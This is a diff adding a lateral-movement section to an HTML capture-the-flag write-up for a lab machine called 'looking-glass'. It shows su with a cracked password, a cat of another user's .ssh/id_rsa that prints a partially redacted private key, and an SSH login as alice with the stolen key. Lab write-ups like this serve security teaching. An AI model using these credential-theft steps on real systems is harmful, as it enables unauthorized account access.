@@ -310,6 +310,63 @@ b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
             <p class="writeup-text"> Hmm. It seems to be some hashes. With the help of <a href="https://github.com/noraj/haiti">Haiti</a>, we can identify what type of hashes it is. They all are SHA256 hashes except the last one, and each can be cracked with the help of John the Ripper. It will make a sentence which tells us that the last line is the password. </p>
             <p class="writeup-text"> In fact, the last encoded sentence is a hexadecimal value that can be translated in string. When decoded from hex, it says: "the password is [REDACTED]". </p>
             <p class="writeup-text"> So we have : humptydumpty:[REDACTED] </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+tweedledum@looking-glass:~$ su humptydumpty
+humptydumpty's password :
+
+humptydumpty@looking-glass:~$
+                </code>
+            </p>
+            <p class="writeup-text"> Let's check if there are another users on the machine : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+humptydumpty@looking-glass:~$ cd ..
+humptydumpty@looking-glass:/home$ ls
+
+alice humptydumpty tweedledum tweedledee
+                </code>
+            </p>
+            <p class="writeup-text"> We all know the users except alice. Let's check what's in alice's directory : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+humptydumpty@looking-glass:/home$ cd alice
+humptydumpty@looking-glass:/home$ ls
+
+-bash: ls : Permission denied
+                </code>
+            </p>
+            <p class="writeup-text"> That's strange. We can cd but we can't display files and folder. Let's check if there is any interesting folder : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+humptydumpty@looking-glass:/home/alice$ cd .ssh
+humptydumpty@looking-glass:/home/alice/.ssh$
+                </code>
+            </p>
+            <p class="writeup-text"> Yeah ! That's nice ! we found a .ssh folder which basically contain id_rsa file. Let's check that : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+humptydumpty@looking-glass:/home/alice/.ssh$ cat id_rsa
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
+NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
+bHHSze.........................[REDACTED]....................cFH
+dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
+k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
+-----END RSA PRIVATE KEY-----
+                </code>
+            </p>
+            <p class="writeup-text"> Found it ! Now we can copy the private key and paste it in our own file id_rsa that we created. Let's set right permissions and connect to alice : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+$ chmod 400 id_rsa
+$ ssh alice@looking.thm -i id_rsa
+
+Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
+alice@looking-glass:~$
+                </code>
+            </p>
         </div>
         <div class="wt-section" id="privesc">
             <h1> Privilege Escalation </h1>
